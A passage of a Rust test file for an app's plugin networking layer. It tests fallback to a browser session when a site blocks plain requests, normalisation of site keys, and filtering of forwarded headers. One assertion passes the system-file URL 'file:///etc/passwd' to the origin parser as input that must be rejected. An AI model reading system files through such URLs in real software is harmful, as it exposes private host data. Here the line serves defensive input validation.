        vec![web_answer(200, blocked.base, &[("content-type", "application/json")], r#"{"via":"session"}"#)],
    );
    let net = NetContext::new("plugin", asking.clone(), true);
    let sent = [("X-Requested-With", "XMLHttpRequest"), ("Referer", "https://site.example/"), ("Cookie", "a=b")];
    let answer = net
        .perform(plugin_request(&format!("{}/api?m=release&id=1", blocked.base), "GET", &sent), vec![], SessionUse::Create)
        .await
        .unwrap();
    assert_eq!(String::from_utf8_lossy(&answer.body), r#"{"via":"session"}"#);
    assert_eq!(answer.meta.status, 200);
    assert_eq!(
        asking.calls(),
        vec![("/api?m=release&id=1".to_string(), vec![("x-requested-with".to_string(), "XMLHttpRequest".to_string())])]
    );
    assert_eq!(blocked.hits(), plain_requests);

    // A session that already answers is used by a background lookup too.
    let warm = FakeSession::in_state(SessionState::Warm, vec![web_answer(200, blocked.base, &[], "warm")]);
    let net = NetContext::new("plugin", warm.clone(), true);
    let answer = net
        .perform(plugin_request(&format!("{}/page", blocked.base), "GET", &[]), vec![], SessionUse::Existing)
        .await
        .unwrap();
    assert_eq!(answer.body, b"warm");

    // The site refuses the session as well: the failure is the one the Verify button is for.
    let host = blocked.base.trim_start_matches("http://").to_string();
    let refusing = FakeSession::new(
        true,
        vec![Err(AppError::VerificationRequired { site: host.clone(), origin: blocked.base.to_string() })],
    );
    let net = NetContext::new("verify-me", refusing.clone(), true);
    let started = Instant::now();
    let _ = net
        .perform(plugin_request(&format!("{}/api", blocked.base), "GET", &[]), vec![], SessionUse::Create)
        .await;
    match net.failure_since(started) {
        Some(AppError::VerificationRequired { site, origin }) => {
            assert_eq!((site, origin.as_str()), (host.clone(), blocked.base));
        }
        other => panic!("unexpected: {:?}", other),
    }
    assert!(anilili_lib::plugins::net::plugins_for_site(&host).contains(&"verify-me".to_string()));
}

#[test]
fn sites_named_at_run_time_are_stable() {
    let site = web_session::site_for_origin("https://Example.org/some/path").unwrap();
    assert_eq!((site.key, site.label, site.origins), ("example.org", "example.org", &["https://example.org"][..]));
    assert!(std::ptr::eq(site, web_session::site_for_origin("https://example.org").unwrap()));
    assert_eq!(web_session::site_for_origin("http://127.0.0.1:8080").unwrap().key, "127.0.0.1:8080");
    assert!(web_session::site_for_origin("file:///etc/passwd").is_none());
    assert!(web_session::site_for_origin("not a url").is_none());
}

#[test]
fn only_headers_a_page_may_set_are_passed_to_the_session() {
    let mut map = reqwest::header::HeaderMap::new();
    for (name, value) in [
        ("referer", "https://site.example/"),
        ("origin", "https://site.example"),
        ("cookie", "a=b"),
        ("user-agent", "x"),
        ("sec-fetch-mode", "cors"),
        ("accept", "application/json"),
        ("x-requested-with", "XMLHttpRequest"),
    ] {
        map.insert(name, value.parse().unwrap());
    }
    let mut passed = session_headers(&map);
    passed.sort();
    assert_eq!(
        passed,
        vec![
            ("accept".to_string(), "application/json".to_string()),
            ("x-requested-with".to_string(), "XMLHttpRequest".to_string()),
        ]
    );

    let url = reqwest::Url::parse("https://site.example/api?m=search&q=a%20b#frag").unwrap();
    assert_eq!(path_and_query(&url), "/api?m=search&q=a%20b");
    assert_eq!(path_and_query(&reqwest::Url::parse("https://site.example").unwrap()), "/");
}
